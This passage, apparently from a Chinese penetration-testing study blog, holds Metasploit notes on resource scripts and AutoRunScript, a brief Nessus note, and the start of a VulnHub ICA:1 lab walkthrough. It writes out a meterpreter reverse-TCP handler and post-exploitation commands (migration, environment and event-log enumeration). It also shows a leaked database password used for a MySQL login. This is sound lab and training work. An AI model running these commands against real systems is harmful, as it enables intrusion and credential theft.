<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">msf5 &gt; use exploit/z9m8r8_test/pcman_cwd_z9m8r8_test</span><br><span class="line">msf5 exploit(z9m8r8_test/pcman_cwd_z9m8r8_test) &gt; edit</span><br></pre></td></tr></table></figure>
<p><strong>未改之前</strong></p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20211210204135159-920433229.png" /></p>
<p><strong>对作者进行修改</strong></p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20211210204158434-2050932697.png" /></p>
<p><strong>未重新加载前</strong></p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20211210204208581-810054529.png" /></p>
<p><strong>重新加载后</strong></p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20211210204223948-1231798113.png" /></p>
<h3 id="资源脚本的使用方法">4、资源脚本的使用方法</h3>
<p>使用资源脚本可以免去手动设置选项，实现选项的自动化设置</p>
<p>创建资源脚本有两种方法：手动创建脚本或使用makerc命令创建脚本。</p>
<p><strong>示例（makerc命令）</strong></p>
<ul>
<li>makerc命令将之前输入过的所有命令都保存到了一个文件中，可以使用resource命令来使用这个文件</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">msf5 &gt; use exploit/multi/handler</span><br><span class="line">msf5 exploit(multi/handler) &gt; <span class="built_in">set</span> payload windows/meterpreter/reverse_tcp</span><br><span class="line">payload =&gt; windows/meterpreter/reverse_tcp</span><br><span class="line">msf5 exploit(multi/handler) &gt; <span class="built_in">set</span> lhost 10.10.10.156</span><br><span class="line">lhost =&gt; 10.10.10.156</span><br><span class="line">msf5 exploit(multi/handler) &gt; <span class="built_in">set</span> lport 4444</span><br><span class="line">lport =&gt; 4444</span><br><span class="line">msf5 exploit(multi/handler) &gt; exploit</span><br><span class="line"></span><br><span class="line">[*] Started reverse TCP handler on 10.10.10.156:4444</span><br><span class="line">^C[-] Exploit failed [user-interrupt]: Interrupt</span><br><span class="line">[-] exploit: Interrupted</span><br><span class="line">msf5 exploit(multi/handler) &gt; makerc</span><br><span class="line">Usage: makerc &lt;output rc file&gt;</span><br><span class="line"></span><br><span class="line">Save the commands executed since startup to the specified file.</span><br><span class="line"></span><br><span class="line">msf5 exploit(multi/handler) &gt; makerc multi_hand</span><br><span class="line">[*] Saving last 6 commands to multi_hand ...</span><br><span class="line">msf5 exploit(multi/handler) &gt; back</span><br><span class="line">msf5 &gt; resource multi_hand</span><br><span class="line">[*] Processing /root/multi_hand <span class="keyword">for</span> ERB directives.</span><br><span class="line">resource (/root/multi_hand)&gt; use exploit/multi/handler</span><br><span class="line">resource (/root/multi_hand)&gt; <span class="built_in">set</span> payload windows/meterpreter/reverse_tcp</span><br><span class="line">payload =&gt; windows/meterpreter/reverse_tcp</span><br><span class="line">resource (/root/multi_hand)&gt; <span class="built_in">set</span> lhost 10.10.10.156</span><br><span class="line">lhost =&gt; 10.10.10.156</span><br><span class="line">resource (/root/multi_hand)&gt; <span class="built_in">set</span> lport 4444</span><br><span class="line">lport =&gt; 4444</span><br><span class="line">resource (/root/multi_hand)&gt; exploit</span><br><span class="line"></span><br><span class="line">[*] Started reverse TCP handler on 10.10.10.156:4444</span><br></pre></td></tr></table></figure>
<h3 id="在-metasploit-中使用-autorunscript">5、在 Metasploit 中使用
AutoRunScript</h3>
<p>通过输入set
AutoRunScript[script-name]来设置AutoRunScript的选项，也可以在资源脚本中直接设置</p>
<p><strong>示例1</strong></p>
<ul>
<li><strong>脚本1：multi_script</strong></li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># more /root/Desktop/muti_script</span></span><br><span class="line">run post/windows/gather/checkvm</span><br><span class="line">run post/windows/manage/migrate</span><br><span class="line">root@kali:~<span class="comment">#</span></span><br></pre></td></tr></table></figure>
<p>说明：checkvm（检查目标系统是否运行在虚拟环境的模块）和migrate（将攻击载荷迁移到安全进程的模块）模块自动化的后渗透脚本</p>
<ul>
<li><strong>脚本2：resource_complete</strong></li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># more /root/Desktop/resource_complete</span></span><br><span class="line">use exploit/multi/handler</span><br><span class="line"><span class="built_in">set</span> payload windows/meterpreter/reverse_tcp</span><br><span class="line"><span class="built_in">set</span> lhost 10.10.10.156</span><br><span class="line"><span class="built_in">set</span> lport 4444</span><br><span class="line"><span class="built_in">set</span> AutoRunScript multi_console_command -r /root/Desktop/muti_script</span><br><span class="line">exploit</span><br><span class="line">root@kali:~<span class="comment">#</span></span><br></pre></td></tr></table></figure>
<p>说明：使用multi_console_command对AutoRunScript进行设置，将multi_console_command设定为-r，这样就允许执行多个后渗透脚本了</p>
<p><strong>运行测试：</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">msf5 &gt; resource /root/Desktop/resource_complete</span><br><span class="line">[*] Processing /root/Desktop/resource_complete <span class="keyword">for</span> ERB directives.</span><br><span class="line">resource (/root/Desktop/resource_complete)&gt; use exploit/multi/handler</span><br><span class="line">resource (/root/Desktop/resource_complete)&gt; <span class="built_in">set</span> payload windows/meterpreter/reverse_tcp</span><br><span class="line">payload =&gt; windows/meterpreter/reverse_tcp</span><br><span class="line">resource (/root/Desktop/resource_complete)&gt; <span class="built_in">set</span> lhost 10.10.10.156</span><br><span class="line">lhost =&gt; 10.10.10.156</span><br><span class="line">resource (/root/Desktop/resource_complete)&gt; <span class="built_in">set</span> lport 4444</span><br><span class="line">lport =&gt; 4444</span><br><span class="line">resource (/root/Desktop/resource_complete)&gt; <span class="built_in">set</span> AutoRunScript multi_console_command -r /root/Desktop/muti_script</span><br><span class="line">AutoRunScript =&gt; multi_console_command -r /root/Desktop/muti_script</span><br><span class="line">resource (/root/Desktop/resource_complete)&gt; exploit</span><br><span class="line"></span><br><span class="line">[*] Started reverse TCP handler on 10.10.10.156:4444</span><br><span class="line">[*] Sending stage (179779 bytes) to 10.10.10.131</span><br><span class="line">[*] Meterpreter session 9 opened (10.10.10.156:4444 -&gt; 10.10.10.131:1114) at 2021-10-08 09:03:34 -0400</span><br><span class="line">[*] Sending stage (179779 bytes) to 10.10.10.131</span><br><span class="line">[*] Meterpreter session 10 opened (10.10.10.156:4444 -&gt; 10.10.10.131:1117) at 2021-10-08 09:03:49 -0400</span><br><span class="line">[*] Session ID 9 (10.10.10.156:4444 -&gt; 10.10.10.131:1114) processing AutoRunScript <span class="string">&#x27;multi_console_command -r /root/Desktop/muti_script&#x27;</span></span><br><span class="line">[*] Running Command List ...</span><br><span class="line">[*] Running <span class="built_in">command</span> run post/windows/gather/checkvm</span><br><span class="line">[*] Session ID 10 (10.10.10.156:4444 -&gt; 10.10.10.131:1117) processing AutoRunScript <span class="string">&#x27;multi_console_command -r /root/Desktop/muti_script&#x27;</span></span><br><span class="line">[*] Running Command List ...</span><br><span class="line">[*] Running <span class="built_in">command</span> run post/windows/gather/checkvm</span><br><span class="line">[*] Checking <span class="keyword">if</span> DH-CA8822AB9589 is a Virtual Machine .....</span><br><span class="line">[+] This is a VMware Virtual Machine</span><br><span class="line">[*] Checking <span class="keyword">if</span> DH-CA8822AB9589 is a Virtual Machine .....</span><br><span class="line">[*] Running <span class="built_in">command</span> run post/windows/manage/migrate</span><br><span class="line">[+] This is a VMware Virtual Machine</span><br><span class="line">[*] Running <span class="built_in">command</span> run post/windows/manage/migrate</span><br><span class="line">[*] Running module against DH-CA8822AB9589</span><br><span class="line">[*] Current server process: notepad.exe (1768)</span><br><span class="line">[*] Spawning notepad.exe process to migrate to</span><br><span class="line">[+] Migrating to 2868</span><br><span class="line">[+] Successfully migrated to process 2868</span><br><span class="line">[*] Running module against DH-CA8822AB9589</span><br><span class="line">[*] Current server process: AcroRd32.exe (2504)</span><br><span class="line">[*] Spawning notepad.exe process to migrate to</span><br><span class="line">[+] Migrating to 3936</span><br><span class="line">meterpreter &gt;</span><br></pre></td></tr></table></figure>
<p><strong>示例2</strong></p>
<ul>
<li>使用multiscript模块代替multi_console_command模块。来创建一个后渗透脚本</li>
</ul>
<p><strong>脚本1：multi_script.rc</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># more /root/Desktop/muti_script.rc</span></span><br><span class="line">checkvm</span><br><span class="line">migrate -n explorer.exe</span><br><span class="line">get_env</span><br><span class="line">event_manager -i</span><br><span class="line">root@kali:~<span class="comment">#</span></span><br></pre></td></tr></table></figure>
<p>说明：checkvm（检查目标系统是否运行在虚拟环境的模块）和migrate（将攻击载荷迁移到安全进程的模块）模块自动化的后渗透脚本使用event_manager模块和参数-
i可以查看目标系统上的所有日志</p>
<p><strong>脚本2：resource_complete</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># more /root/Desktop/resource_complete</span></span><br><span class="line">use exploit/multi/handler</span><br><span class="line"><span class="built_in">set</span> payload windows/meterpreter/reverse_tcp</span><br><span class="line"><span class="built_in">set</span> lhost 10.10.10.156</span><br><span class="line"><span class="built_in">set</span> lport 4444</span><br><span class="line"><span class="built_in">set</span> AutoRunScript multiscript -r /root/Desktop/muti_script.rc</span><br><span class="line">exploit</span><br><span class="line">root@kali:~<span class="comment">#</span></span><br></pre></td></tr></table></figure>
<p><strong>注意</strong> ：AutoRunScript参数依旧设定为-r</p>
<p><strong>运行测试：</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">msf5 &gt; resource /root/Desktop/resource_complete</span><br><span class="line">[*] Processing /root/Desktop/resource_complete <span class="keyword">for</span> ERB directives.</span><br><span class="line">resource (/root/Desktop/resource_complete)&gt; use exploit/multi/handler</span><br><span class="line">resource (/root/Desktop/resource_complete)&gt; <span class="built_in">set</span> payload windows/meterpreter/reverse_tcp</span><br><span class="line">payload =&gt; windows/meterpreter/reverse_tcp</span><br><span class="line">resource (/root/Desktop/resource_complete)&gt; <span class="built_in">set</span> lhost 10.10.10.156</span><br><span class="line">lhost =&gt; 10.10.10.156</span><br><span class="line">resource (/root/Desktop/resource_complete)&gt; <span class="built_in">set</span> lport 4444</span><br><span class="line">lport =&gt; 4444</span><br><span class="line">resource (/root/Desktop/resource_complete)&gt; <span class="built_in">set</span> AutoRunScript multiscript -r /root/Desktop/muti_script.rc</span><br><span class="line">AutoRunScript =&gt; multiscript -r /root/Desktop/muti_script.rc</span><br><span class="line">resource (/root/Desktop/resource_complete)&gt; exploit</span><br><span class="line"></span><br><span class="line">[*] Started reverse TCP handler on 10.10.10.156:4444</span><br><span class="line">[*] Sending stage (179779 bytes) to 10.10.10.131</span><br><span class="line">[*] Meterpreter session 4 opened (10.10.10.156:4444 -&gt; 10.10.10.131:1072) at 2021-10-08 09:37:42 -0400</span><br><span class="line">[*] Session ID 4 (10.10.10.156:4444 -&gt; 10.10.10.131:1072) processing AutoRunScript <span class="string">&#x27;multiscript -r /root/Desktop/muti_script.rc&#x27;</span></span><br><span class="line">[*] Running Multiscript script.....</span><br><span class="line">[*] Running script List ...</span><br><span class="line">[*] running script checkvm</span><br><span class="line">[!] Meterpreter scripts are deprecated. Try post/windows/gather/checkvm.</span><br><span class="line">[!] Example: run post/windows/gather/checkvm OPTION=value [...]</span><br><span class="line">[*] Checking <span class="keyword">if</span> target is a Virtual Machine .....</span><br><span class="line">[*] This is a VMware Virtual Machine</span><br><span class="line">[*] running script migrate -n explorer.exe</span><br><span class="line">[!] Meterpreter scripts are deprecated. Try post/windows/manage/migrate.</span><br><span class="line">[!] Example: run post/windows/manage/migrate OPTION=value [...]</span><br><span class="line">[*] Current server process: AcroRd32.exe (3744)</span><br><span class="line">[+] Migrating to 1640</span><br><span class="line">[+] Successfully migrated to process</span><br><span class="line">[*] running script get_env</span><br><span class="line">[!] Meterpreter scripts are deprecated. Try post/multi/gather/env.</span><br><span class="line">[!] Example: run post/multi/gather/env OPTION=value [...]</span><br><span class="line">[*] Getting all System and User Variables</span><br><span class="line"></span><br><span class="line">Enviroment Variable list</span><br><span class="line">========================</span><br><span class="line"></span><br><span class="line">Name Value</span><br><span class="line">---- -----</span><br><span class="line">APPDATA C:\Documents and Settings\Administrator\Application Data</span><br><span class="line">CLIENTNAME Console</span><br><span class="line">ComSpec C:\WINDOWS\system32\cmd.exe</span><br><span class="line">FP_NO_HOST_CHECK NO</span><br><span class="line">HOMEDRIVE C:</span><br><span class="line">HOMEPATH \Documents and Settings\Administrator</span><br><span class="line">HOMESHARE 仐㰈</span><br><span class="line">ŗ</span><br><span class="line">D</span><br><span class="line">LOGONSERVER \\DH-CA8822AB9589</span><br><span class="line">NUMBER_OF_PROCESSORS 1</span><br><span class="line">OS Windows_NT</span><br><span class="line">PATHEXT .COM;.EXE;.BAT;.CMD;.VBS;.VBE;.JS;.JSE;.WSF;.WSH</span><br><span class="line">PROCESSOR_ARCHITECTURE x86</span><br><span class="line">PROCESSOR_IDENTIFIER x86 Family 6 Model 142 Stepping 11, GenuineIntel</span><br><span class="line">PROCESSOR_LEVEL 6</span><br><span class="line">PROCESSOR_REVISION 8e0b</span><br><span class="line">Path C:\WINDOWS\system32;C:\WINDOWS;C:\WINDOWS\System32\Wbem</span><br><span class="line">SESSIONNAME Console</span><br><span class="line">TEMP C:\DOCUME~1\ADMINI~1\LOCALS~1\Temp</span><br><span class="line">TMP C:\DOCUME~1\ADMINI~1\LOCALS~1\Temp</span><br><span class="line">windir C:\WINDOWS</span><br><span class="line"></span><br><span class="line">[*] running script event_manager -i</span><br><span class="line">[*] Retriving Event Log Configuration</span><br><span class="line"></span><br><span class="line">Event Logs on System</span><br><span class="line">====================</span><br><span class="line"></span><br><span class="line">Name Retention Maximum Size Records</span><br><span class="line">---- --------- ------------ -------</span><br><span class="line">Application Disabled 524288K 480</span><br><span class="line">Security Disabled 524288K 0</span><br><span class="line">System Disabled 524288K 881</span><br><span class="line"></span><br><span class="line">meterpreter &gt; getuid</span><br><span class="line">Server username: DH-CA8822AB9589\Administrator</span><br><span class="line">meterpreter &gt; getpid</span><br><span class="line">Current pid: 1640</span><br><span class="line">meterpreter &gt; ps</span><br><span class="line"></span><br><span class="line">Process List</span><br><span class="line">============</span><br><span class="line"></span><br><span class="line">PID PPID Name Arch Session User Path</span><br><span class="line">--- ---- ---- ---- ------- ---- ----</span><br><span class="line">0 0 [System Process]</span><br><span class="line">…………</span><br><span class="line">1408 676 spoolsv.exe x86 0 NT AUTHORITY\SYSTEM C:\WINDOWS\system32\spoolsv.exe</span><br><span class="line">1640 1620 explorer.exe x86 0 DH-CA8822AB9589\Administrator C:\WINDOWS\Explorer.EXE</span><br><span class="line">1748 1640 VMwareTray.exe x86 0 DH-CA8822AB9589\Administrator C:\Program Files\VMware\VMware Tools\VMwareTray.exe</span><br><span class="line">…………</span><br><span class="line">meterpreter &gt;</span><br></pre></td></tr></table></figure>
<h3 id="metasploit-中的全局变量">6、Metasploit 中的全局变量</h3>
<p>使用setg命令可以实现RHOST或者LHOST选项的全局化，让它们可以被所有模块使用</p>
<p>示例</p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20211210204928666-502503081.png" /></p>
<p>get命令用来显示一个变量的值，而getg命令用来显示一个全局变量的值</p>
]]></content>
      <categories>
        <category>精通Metasploit渗透测试 第2版</category>
      </categories>
      <tags>
        <tag>Metasploit</tag>
      </tags>
  </entry>
  <entry>
    <title>NESSUS</title>
    <url>/2022/01/26/NESSUS/</url>
    <content><![CDATA[<p><strong>Nessus中文使用教程：<a
href="https://www.wangan.com/docs/nessus"
class="uri">https://www.wangan.com/docs/nessus</a></strong></p>
<p><strong>SMTP配置注意：</strong></p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220126102521957-2130539878.png" /></p>
<p><strong>上图中的 Password
是smtp开启时的授权码（下图），不是邮箱登录密码！！！</strong></p>
<p><strong><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220126102041147-961342672.png" /></strong></p>
]]></content>
      <categories>
        <category>Kail Linux渗透测试</category>
        <category>信息收集</category>
      </categories>
      <tags>
        <tag>漏洞扫描</tag>
      </tags>
  </entry>
  <entry>
    <title>ICA: 1</title>
    <url>/2024/04/18/ICA%201/</url>
    <content><![CDATA[<blockquote>
<p>靶机：<a href="https://www.vulnhub.com/entry/ica-1,748/">ICA: 1 ~
VulnHub</a></p>
</blockquote>
<h2 id="信息收集">1. 信息收集</h2>
<h3 id="主机探测">1.1. 主机探测</h3>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">netdiscover  -r 192.168.159.0/24</span><br></pre></td></tr></table></figure>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Currently scanning: Finished!   |   Screen View: Unique Hosts             </span><br><span class="line">4 Captured ARP Req/Rep packets, from 4 hosts.   Total size: 240       </span><br><span class="line">_____________________________________________________________________________</span><br><span class="line">  IP            At MAC Address     Count     Len  MAC Vendor / Hostname      </span><br><span class="line">-----------------------------------------------------------------------------</span><br><span class="line">192.168.159.1   00:50:56:c0:00:08      1      60  VMware, Inc.         </span><br><span class="line">192.168.159.2   00:50:56:e0:3a:a5      1      60  VMware, Inc.           </span><br><span class="line">192.168.159.153 00:0c:29:<span class="built_in">fc</span>:<span class="built_in">fc</span>:1f      1      60  VMware, Inc.         </span><br><span class="line">192.168.159.254 00:50:56:fa:94:af      1      60  VMware, Inc. </span><br></pre></td></tr></table></figure>
<p>靶机：192.168.159.153</p>
<h3 id="端口扫描">1.2. 端口扫描</h3>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Starting Nmap 7.94 ( https://nmap.org ) at 2024-04-17 07:38 EDT</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 192.168.159.153</span><br><span class="line">Host is up (0.0015s latency).</span><br><span class="line">Not shown: 65531 closed tcp ports (reset)</span><br><span class="line">PORT      STATE SERVICE VERSION</span><br><span class="line">22/tcp    open  ssh     OpenSSH 8.4p1 Debian 5 (protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   3072 0e:77:d9:cb:f8:05:41:b9:e4:45:71:c1:01:ac:da:93 (RSA)</span><br><span class="line">|   256 40:51:93:4b:f8:37:85:fd:a5:f4:d7:27:41:6c:a0:a5 (ECDSA)</span><br><span class="line">|_  256 09:85:60:c5:35:c1:4d:83:76:93:fb:c7:f0:<span class="built_in">cd</span>:7b:8e (ED25519)</span><br><span class="line">80/tcp    open  http    Apache httpd 2.4.48 ((Debian))</span><br><span class="line">|_http-title: qdPM | Login</span><br><span class="line">|_http-server-header: Apache/2.4.48 (Debian)</span><br><span class="line">3306/tcp  open  mysql   MySQL 8.0.26</span><br><span class="line">|_ssl-<span class="built_in">date</span>: TLS randomness does not represent time</span><br><span class="line">| mysql-info: </span><br><span class="line">|   Protocol: 10</span><br><span class="line">|   Version: 8.0.26</span><br><span class="line">|   Thread ID: 40</span><br><span class="line">|   Capabilities flags: 65535</span><br><span class="line">|   Some Capabilities: Speaks41ProtocolOld, LongColumnFlag, Support41Auth, SupportsTransactions, FoundRows, IgnoreSigpipes, LongPassword, SupportsCompression, SwitchToSSLAfterHandshake, Speaks41ProtocolNew, IgnoreSpaceBeforeParenthesis, ConnectWithDatabase, SupportsLoadDataLocal, ODBCClient, InteractiveClient, DontAllowDatabaseTableColumn, SupportsAuthPlugins, SupportsMultipleStatments, SupportsMultipleResults</span><br><span class="line">|   Status: Autocommit</span><br><span class="line">|   Salt: &amp;\x7FDO\x1CR)-\x1F&amp;%eO\x07\x02B\x1F@Dk</span><br><span class="line">|_  Auth Plugin Name: caching_sha2_password</span><br><span class="line">| ssl-cert: Subject: commonName=MySQL_Server_8.0.26_Auto_Generated_Server_Certificate</span><br><span class="line">| Not valid before: 2021-09-25T10:47:29</span><br><span class="line">|_Not valid after:  2031-09-23T10:47:29</span><br><span class="line">33060/tcp open  mysqlx?</span><br><span class="line">| fingerprint-strings: </span><br><span class="line">|   DNSStatusRequestTCP, LDAPSearchReq, NotesRPC, SSLSessionReq, TLSSessionReq, X11Probe, afp: </span><br><span class="line">|     Invalid message<span class="string">&quot;</span></span><br><span class="line"><span class="string">|     HY000</span></span><br><span class="line"><span class="string">|   LDAPBindReq: </span></span><br><span class="line"><span class="string">|     *Parse error unserializing protobuf message&quot;</span></span><br><span class="line">|     HY000</span><br><span class="line">|   oracle-tns: </span><br><span class="line">|     Invalid message-frame.<span class="string">&quot;</span></span><br><span class="line"><span class="string">|_    HY000</span></span><br><span class="line"><span class="string">1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :</span></span><br><span class="line"><span class="string">SF-Port33060-TCP:V=7.94%I=7%D=4/17%Time=661FB4DD%P=x86_64-pc-linux-gnu%r(N</span></span><br><span class="line"><span class="string">SF:ULL,9,&quot;</span>\x05\0\0\0\x0b\x08\x05\x1a\0<span class="string">&quot;)%r(GenericLines,9,&quot;</span>\x05\0\0\0\x0b\</span><br><span class="line">SF:x08\x05\x1a\0<span class="string">&quot;)%r(GetRequest,9,&quot;</span>\x05\0\0\0\x0b\x08\x05\x1a\0<span class="string">&quot;)%r(HTTPOp</span></span><br><span class="line"><span class="string">SF:tions,9,&quot;</span>\x05\0\0\0\x0b\x08\x05\x1a\0<span class="string">&quot;)%r(RTSPRequest,9,&quot;</span>\x05\0\0\0\x0b</span><br><span class="line">SF:\x08\x05\x1a\0<span class="string">&quot;)%r(RPCCheck,9,&quot;</span>\x05\0\0\0\x0b\x08\x05\x1a\0<span class="string">&quot;)%r(DNSVers</span></span><br><span class="line"><span class="string">SF:ionBindReqTCP,9,&quot;</span>\x05\0\0\0\x0b\x08\x05\x1a\0<span class="string">&quot;)%r(DNSStatusRequestTCP,2</span></span><br><span class="line"><span class="string">SF:B,&quot;</span>\x05\0\0\0\x0b\x08\x05\x1a\0\x1e\0\0\0\x01\x08\x01\x10\x88<span class="string">&#x27;\x1a\x0fI</span></span><br><span class="line"><span class="string">SF:nvalid\x20message\&quot;\x05HY000&quot;)%r(Help,9,&quot;\x05\0\0\0\x0b\x08\x05\x1a\0&quot;)</span></span><br><span class="line"><span class="string">SF:%r(SSLSessionReq,2B,&quot;\x05\0\0\0\x0b\x08\x05\x1a\0\x1e\0\0\0\x01\x08\x01</span></span><br><span class="line"><span class="string">SF:\x10\x88&#x27;</span>\x1a\x0fInvalid\x20message\&quot;\x05HY000<span class="string">&quot;)%r(TerminalServerCookie</span></span><br><span class="line"><span class="string">SF:,9,&quot;</span>\x05\0\0\0\x0b\x08\x05\x1a\0<span class="string">&quot;)%r(TLSSessionReq,2B,&quot;</span>\x05\0\0\0\x0b\x</span><br><span class="line">SF:08\x05\x1a\0\x1e\0\0\0\x01\x08\x01\x10\x88<span class="string">&#x27;\x1a\x0fInvalid\x20message\&quot;</span></span><br><span class="line"><span class="string">SF:\x05HY000&quot;)%r(Kerberos,9,&quot;\x05\0\0\0\x0b\x08\x05\x1a\0&quot;)%r(SMBProgNeg,9</span></span><br><span class="line"><span class="string">SF:,&quot;\x05\0\0\0\x0b\x08\x05\x1a\0&quot;)%r(X11Probe,2B,&quot;\x05\0\0\0\x0b\x08\x05\</span></span><br><span class="line"><span class="string">SF:x1a\0\x1e\0\0\0\x01\x08\x01\x10\x88&#x27;</span>\x1a\x0fInvalid\x20message\&quot;\x05HY0</span><br><span class="line">SF:00<span class="string">&quot;)%r(FourOhFourRequest,9,&quot;</span>\x05\0\0\0\x0b\x08\x05\x1a\0<span class="string">&quot;)%r(LPDString,</span></span><br><span class="line"><span class="string">SF:9,&quot;</span>\x05\0\0\0\x0b\x08\x05\x1a\0<span class="string">&quot;)%r(LDAPSearchReq,2B,&quot;</span>\x05\0\0\0\x0b\x0</span><br><span class="line">SF:8\x05\x1a\0\x1e\0\0\0\x01\x08\x01\x10\x88<span class="string">&#x27;\x1a\x0fInvalid\x20message\&quot;\</span></span><br><span class="line"><span class="string">SF:x05HY000&quot;)%r(LDAPBindReq,46,&quot;\x05\0\0\0\x0b\x08\x05\x1a\x009\0\0\0\x01\</span></span><br><span class="line"><span class="string">SF:x08\x01\x10\x88&#x27;</span>\x1a\*Parse\x20error\x20unserializing\x20protobuf\x20me</span><br><span class="line">SF:ssage\&quot;\x05HY000<span class="string">&quot;)%r(SIPOptions,9,&quot;</span>\x05\0\0\0\x0b\x08\x05\x1a\0<span class="string">&quot;)%r(LAN</span></span><br><span class="line"><span class="string">SF:Desk-RC,9,&quot;</span>\x05\0\0\0\x0b\x08\x05\x1a\0<span class="string">&quot;)%r(TerminalServer,9,&quot;</span>\x05\0\0\</span><br><span class="line">SF:0\x0b\x08\x05\x1a\0<span class="string">&quot;)%r(NCP,9,&quot;</span>\x05\0\0\0\x0b\x08\x05\x1a\0<span class="string">&quot;)%r(NotesRP</span></span><br><span class="line"><span class="string">SF:C,2B,&quot;</span>\x05\0\0\0\x0b\x08\x05\x1a\0\x1e\0\0\0\x01\x08\x01\x10\x88<span class="string">&#x27;\x1a\x</span></span><br><span class="line"><span class="string">SF:0fInvalid\x20message\&quot;\x05HY000&quot;)%r(JavaRMI,9,&quot;\x05\0\0\0\x0b\x08\x05\x</span></span><br><span class="line"><span class="string">SF:1a\0&quot;)%r(WMSRequest,9,&quot;\x05\0\0\0\x0b\x08\x05\x1a\0&quot;)%r(oracle-tns,32,&quot;</span></span><br><span class="line"><span class="string">SF:\x05\0\0\0\x0b\x08\x05\x1a\0%\0\0\0\x01\x08\x01\x10\x88&#x27;</span>\x1a\x16Invalid</span><br><span class="line">SF:\x20message-frame\.\&quot;\x05HY000<span class="string">&quot;)%r(ms-sql-s,9,&quot;</span>\x05\0\0\0\x0b\x08\x05\x</span><br><span class="line">SF:1a\0<span class="string">&quot;)%r(afp,2B,&quot;</span>\x05\0\0\0\x0b\x08\x05\x1a\0\x1e\0\0\0\x01\x08\x01\x10</span><br><span class="line">SF:\x88<span class="string">&#x27;\x1a\x0fInvalid\x20message\&quot;\x05HY000&quot;);</span></span><br><span class="line"><span class="string">MAC Address: 00:0C:29:FC:FC:1F (VMware)</span></span><br><span class="line"><span class="string">Device type: general purpose</span></span><br><span class="line"><span class="string">Running: Linux 4.X|5.X</span></span><br><span class="line"><span class="string">OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5</span></span><br><span class="line"><span class="string">OS details: Linux 4.15 - 5.8</span></span><br><span class="line"><span class="string">Network Distance: 1 hop</span></span><br><span class="line"><span class="string">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">TRACEROUTE</span></span><br><span class="line"><span class="string">HOP RTT     ADDRESS</span></span><br><span class="line"><span class="string">1   1.46 ms 192.168.159.153</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span></span><br><span class="line"><span class="string">Nmap done: 1 IP address (1 host up) scanned in 32.44 seconds</span></span><br></pre></td></tr></table></figure>
<h3 id="web-信息收集">1.3. Web 信息收集</h3>
<p>80 部署了项目管理系统 qdPM 【9.2】，扫目录并找找历史漏洞</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">dirsearch -u <span class="string">&quot;http://192.168.159.153&quot;</span> -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -e php,txt,json,html -f -t 50</span><br><span class="line"></span><br><span class="line">searchsploit qdpm</span><br></pre></td></tr></table></figure>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202404180900435.png" /></p>
<p>有个信息泄露的漏洞</p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202404180902282.png" /></p>
<p>得数据库配置信息</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">all:</span><br><span class="line">  doctrine:</span><br><span class="line">    class: sfDoctrineDatabase</span><br><span class="line">    param:</span><br><span class="line">      dsn: <span class="string">&#x27;mysql:dbname=qdpm;host=localhost&#x27;</span></span><br><span class="line">      profiler: <span class="literal">false</span></span><br><span class="line">      username: qdpmadmin</span><br><span class="line">      password: <span class="string">&quot;&lt;?php echo urlencode(&#x27;UcVQCMQk2STVeS6J&#x27;) ; ?&gt;&quot;</span></span><br><span class="line">      attributes:</span><br><span class="line">        quote_identifier: <span class="literal">true</span>  </span><br></pre></td></tr></table></figure>
<p>靶机开了 3306，直接尝试登录</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">mysql -h 192.168.159.153  -uqdpmadmin -pUcVQCMQk2STVeS6J -Dqdpm</span><br></pre></td></tr></table></figure>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202404180903455.png" /></p>
<p>找到了 qdPM 登录所需的用户信息</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">admin@localhost.com</span><br><span class="line">$P<span class="variable">$Ed22H8i1lt1q</span>/v.8d.FhKU1PyoQws2.</span><br></pre></td></tr></table></figure>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202404180903456.png" /></p>
<p>利用 john 破解password 未果！或许可以直接换个密码【操作见 3.1】</p>
<p>目录扫描结果</p>
